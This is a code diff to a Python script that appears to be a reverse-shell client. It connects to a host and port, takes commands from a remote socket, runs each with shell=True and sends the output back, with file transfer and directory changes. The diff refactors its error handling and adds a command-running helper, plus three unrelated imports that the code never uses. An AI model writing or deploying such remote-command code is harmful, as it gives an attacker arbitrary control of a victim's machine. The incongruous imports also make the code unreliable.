@@ -6,6 +6,8 @@ import traceback
 import os
 
 from duplicity.cli_data import command_args_expected
+from ldap3.core.exceptions import exception_table
+from uaclient.lock import clear_lock_file_if_present
 
 
 def start_connection(host, port):
@@ -31,6 +33,12 @@ def recv_file(filename, client):
             f.write(chunk)
 
 
+def run_command(command):
+    result = subprocess.run(command, shell=True, capture_output=True, text=True)
+    output = result.stdout + result.stderr
+    return output
+
+
 def shell_session(client):
     
     exit_list = ['exit', 'break', 'close', 'bye', 'quit']
@@ -47,18 +55,19 @@ def shell_session(client):
                 filename = command[5:]
                 recv_file(filename, client)
             elif command.startswith('cd '):
+                path = command[3:].strip()
                 try:
-                    os.chdir(command[3:])
+                    os.chdir(path)
                     client.send('chdir'.encode())
-                except PermissionError:
-                    client.send('Permission denied.'.encode())
-                except FileNotFoundError:
-                    client.send(f'File not found: "{command[3:]}"'.encode())
                 except NotADirectoryError:
-                    client.send(f'Not a directory: "{command[3:]}"'.encode())
+                    client.send(f'Error: Not a directory: "{path}"'.encode())
+                except FileNotFoundError:
+                    client.send(f'Error: No such directory: "{path}"'.encode())
+                except PermissionError:
+                    client.send(f'Error: Permission denied: "{path}"'.encode())
             else:
                 try:
-                    output = subprocess.check_output(command, shell=True, text=True)
+                    output = run_command(command)
                     if not output:
                         client.send('no output!'.encode())
                     else:
